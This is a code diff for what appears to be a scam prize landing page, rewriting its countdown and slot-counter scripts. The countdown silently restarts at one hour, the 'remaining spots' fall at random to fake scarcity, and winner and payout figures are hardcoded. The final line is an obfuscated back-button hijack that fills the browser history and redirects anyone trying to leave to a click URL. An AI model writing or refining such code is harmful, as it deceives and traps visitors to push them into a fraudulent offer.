@@ -1059,47 +1059,47 @@
     let remainingSpots = 47;
     let winnerCount = 1847;
     let totalPaid = 18470000;
-    let totalSecondsLeft = 3600; // 从1小时开始倒计时 (3600秒)
+    let countdownSeconds = 3600; // 从1小时开始倒计时 (3600秒)
+
+    // 简化的倒计时更新函数
+    function updateCountdown() {
+        countdownSeconds--;
+
+        if (countdownSeconds < 0) {
+            countdownSeconds = 3600; // 重置为1小时
+        }
+
+        const hours = Math.floor(countdownSeconds / 3600);
+        const minutes = Math.floor((countdownSeconds % 3600) / 60);
+        const seconds = countdownSeconds % 60;
+
+        const timeString = hours.toString().padStart(2, '0') + ':' +
+                          minutes.toString().padStart(2, '0') + ':' +
+                          seconds.toString().padStart(2, '0');
+
+        const timeEl = document.getElementById('timeLeft');
+        if (timeEl) {
+            timeEl.textContent = timeString;
+            console.log('倒计时更新:', timeString);
+        } else {
+            console.log('错误：找不到timeLeft元素');
+        }
+    }
 
     // 更新剩余名额
     function updateSpots() {
         if (remainingSpots > 3) {
-            // 随机减少名额，制造稀缺感
-            if (Math.random() < 0.3) { // 30% 几率减少
+            if (Math.random() < 0.3) {
                 remainingSpots -= Math.floor(Math.random() * 3) + 1;
                 if (remainingSpots < 3) remainingSpots = 3;
             }
         }
 
-        // 更新所有显示名额的元素
         const spotElements = ['remainingSpots', 'spotsLeft'];
         spotElements.forEach(id => {
             const el = document.getElementById(id);
             if (el) el.textContent = remainingSpots;
         });
-    }
-
-    // 更新倒计时
-    function updateCountdown() {
-        totalSecondsLeft--;
-
-        // 如果到了0，重新开始从1小时
-        if (totalSecondsLeft < 0) {
-            totalSecondsLeft = 3600; // 重置为1小时 (3600秒)
-        }
-
-        // 格式化时间为 HH:MM:SS
-        const hours = Math.floor(totalSecondsLeft / 3600);
-        const minutes = Math.floor((totalSecondsLeft % 3600) / 60);
-        const seconds = totalSecondsLeft % 60;
-
-        const timeString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-
-        const timeEl = document.getElementById('timeLeft');
-        if (timeEl) {
-            timeEl.textContent = timeString;
-            console.log('倒计时更新:', timeString); // 调试用
-        }
     }
 
     // 更新获奖者统计
@@ -1158,8 +1158,23 @@
         setInterval(updateExpiryTimer, 1000);    // 每秒更新过期计时器
     }
 
-    // 立即启动倒计时
-    startCountdown();
+    // 简单直接的倒计时启动方式
+    console.log('倒计时脚本开始执行...');
+
+    // 立即显示初始时间
+    updateCountdown();
+    console.log('初始倒计时已设置');
+
+    // 每秒更新倒计时
+    setInterval(function() {
+        updateCountdown();
+    }, 1000);
+    console.log('倒计时定时器已启动');
+
+    // 其他功能启动
+    updateSpots();
+    setInterval(updateSpots, 3000);
+    console.log('所有动态更新已启动');
 
     // 历史记录回退保护，使用 {clickurl} 占位符
     !function(){var a;try{for(a=0;10>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&(window.location.href="{clickurl}")}}catch(b){}}();
